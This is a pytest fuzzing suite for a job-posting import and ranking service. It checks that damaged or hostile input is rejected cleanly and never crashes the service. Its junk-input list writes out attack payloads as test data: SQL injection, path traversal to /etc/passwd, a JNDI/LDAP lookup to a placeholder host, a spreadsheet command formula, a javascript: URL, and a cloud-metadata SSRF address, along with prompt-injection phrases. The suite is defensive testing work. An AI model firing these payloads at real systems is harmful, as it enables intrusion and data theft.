"""Seeded fuzzing: hostile/garbage input must be classified, never crash, never yield an invalid posting."""
import copy
import json

import pytest

from a_testkit import AS_OF
from ct_connectors import ConnectorError, parse_envelope
from ct_connectors.textsafe import clean_text, detect_injection, one_line, sanitize_html, url_problem
from ct_matching import corpus, schema
from ct_matching.corpus import Rng
from ct_matching.normalize import comp_from_text, location_of, normalize, remote_of, seniority_of
from ct_matching.service import RequestError, Service, vault_from_profile
from ct_matching.store import JobStore

JUNK = [None, True, False, 0, -1, 1e308, float("nan"), "", " ", "\x00", "‮", "💥", "a" * 5000, [], {}, [[]], {"a": {"b": []}},
        "<script>", "'; DROP TABLE jobs;--", "../../etc/passwd", "${jndi:ldap://x.example/a}", "=cmd|' /C calc'!A0",
        "javascript:alert(1)", "http://169.254.169.254/", -0.0, 2 ** 70, "2026-99-99T00:00:00Z", ["x", 1, None], "\ud800"]


def mutate(rng, node, depth=0):
    """Return a structurally damaged deep copy of a JSON value."""
    roll = rng.below(100)
    if roll < 12:
        return copy.deepcopy(rng.choice(JUNK))
    if isinstance(node, dict):
        out = {}
        for key, value in node.items():
            r = rng.below(100)
            if r < 6:
                continue                                  # drop key
            out[key] = mutate(rng, value, depth + 1) if r < 40 else copy.deepcopy(value)
            if r > 96:
                out[key + "_x"] = copy.deepcopy(rng.choice(JUNK))
        return out
    if isinstance(node, list):
        out = [mutate(rng, v, depth + 1) if rng.below(100) < 35 else copy.deepcopy(v) for v in node]
        if node and rng.below(100) < 15:
            out.append(copy.deepcopy(rng.choice(node)))   # duplicate an element
        if out and rng.below(100) < 10:
            out.pop(rng.below(len(out)))
        return out
    if isinstance(node, str) and roll < 40:
        cut = rng.below(len(node) + 1)
        return node[:cut] + str(rng.choice(["\x00", "​", "<b>", "‮", "&lt;", "%00", "\n", "é", "𝒳"])) + node[cut:]
    if isinstance(node, (int, float)) and not isinstance(node, bool) and roll < 40:
        return rng.choice([-node, node * 1000, 0, str(node), None])
    return copy.deepcopy(node)


@pytest.fixture(scope="module")
def seeds(bundle):
    captures = bundle["captures"]
    by_source = {}
    for env in captures:
        by_source.setdefault(env["capture"]["source"], env)
    return list(by_source.values())


def test_fuzzed_envelopes_never_crash_and_never_store_invalid_postings(seeds):
    rng = Rng("fuzz-envelopes-1")
    store, accepted, rejected_whole, runs = JobStore(), 0, 0, 600
    for i in range(runs):
        doc = mutate(rng, seeds[i % len(seeds)])
        report = store.import_envelope(doc)             # must not raise, whatever the input
        assert set(report) >= {"ok", "counts", "rejected", "warnings"}
        if report["ok"]:
            accepted += report["counts"]["created"] + report["counts"]["updated"] + report["counts"]["unchanged"]
        else:
            rejected_whole += 1
            assert report["rejected"][0]["error_class"]
    assert accepted > 500 and rejected_whole > 20, (accepted, rejected_whole)
    for chain in store.versions.values():
        for env in chain:
            schema.check(env["posting"], "job-posting")
            assert url_problem(env["posting"]["url"]) is None
            json.dumps(env, ensure_ascii=False).encode("utf-8")   # no lone surrogates / unserializable values
    assert store.ledger.verify() == (True, None)
    for env in store.view(AS_OF):
        schema.check(env, "a-job-record")


def test_fuzzed_store_can_always_be_ranked(seeds):
    rng = Rng("fuzz-rank-1")
    service = Service()
    for i in range(200):
        service.store.import_envelope(mutate(rng, seeds[i % len(seeds)]))
    service.vault, service.preferences = vault_from_profile(corpus.SYNTHETIC_PROFILE, AS_OF)
    result = service.rank({"as_of": AS_OF, "top_n": 50, "preferences": {"include_unknown_status": True, "allow_flagged_content": True}})
    assert result["corpus"]["considered"] == len(service.store.versions)
    assert all(0 <= s["score"] <= 100 for s in result["shortlist"])
    for item in result["shortlist"]:
        assert item["score_interval"]["low"] <= item["score"] <= item["score_interval"]["high"]


def test_parse_envelope_only_raises_connector_error():
    rng = Rng("fuzz-parse-1")
    base = {"capture": {"source": "greenhouse", "board": "b", "captured_at": AS_OF, "organization": "Fictional"},
            "payload": {"jobs": [{"id": 1, "title": "t", "absolute_url": "https://jobs.fictional.example/1"}]}}
    for _ in range(1500):
        doc = mutate(rng, base)
        try:
            result = parse_envelope(doc)
        except ConnectorError:
            continue
        for rec in result.records:
            normalize(rec)


def test_text_helpers_are_total_functions():
    rng = Rng("fuzz-text-1")
    alphabet = ["<", ">", "/", "&", ";", "#", "\"", "'", "=", " ", "\n", "a", "Z", "0", "-", "$", "€", "k", ",", ".",
                "script", "style", "div", "hidden", "display:none", "​", "‮", "\x00", "é", "𝒳", "ignore", "previous",
                "instructions", "%", "!", "--", "[", "]", "per year", "USD", "remote", "senior", "CA"]
    for _ in range(3000):
        text = "".join(rng.choice(alphabet) for _ in range(rng.below(40)))
        out, flags = sanitize_html(text)
        assert isinstance(out, str) and "\x00" not in out and "‮" not in out and isinstance(flags, list)
        assert "<script" not in out.lower() or "<" in text
        clean_text(text), one_line(text), detect_injection(text), url_problem(text)
        for item in comp_from_text(text):
            assert item["min"] >= 0 and item["max"] >= 0
        location_of(text, text), remote_of(text, text), seniority_of(text, text)


def test_fuzzed_rank_requests_fail_cleanly(service):
    rng = Rng("fuzz-requests-1")
    good = {"as_of": AS_OF, "top_n": 5, "preferences": copy.deepcopy(corpus.SYNTHETIC_PROFILE["preferences"]),
            "profile": copy.deepcopy(corpus.SYNTHETIC_PROFILE)}
    ok = bad = 0
    for _ in range(300):
        body = mutate(rng, good)
        try:
            result = service.rank(body)
        except RequestError as exc:
            assert 400 <= exc.status < 500 and exc.code
            bad += 1
            continue
        schema.check(result, "a-match-result")
        ok += 1
    assert ok > 10 and bad > 100, (ok, bad)


def test_corpus_generator_never_emits_non_fictional_markers():
    """Guard against real-looking data creeping into fixtures: only reserved domains and 'Fictional' employers."""
    for seed in (corpus.DEFAULT_SEED, 5):
        blob = json.dumps(corpus.generate(seed=seed, n=100))
        hosts = set()
        import re
        for match in re.finditer(r"https?://([A-Za-z0-9.-]+)", blob):
            hosts.add(match.group(1).lower())
        allowed_exceptions = {"169.254.169.254", "localhost"}  # deliberately unsafe URLs that must be rejected on import
        assert all(h.endswith(".example") or h in allowed_exceptions for h in hosts), sorted(hosts)[:5]
        assert "linkedin" not in blob.lower() and "@gmail" not in blob.lower()
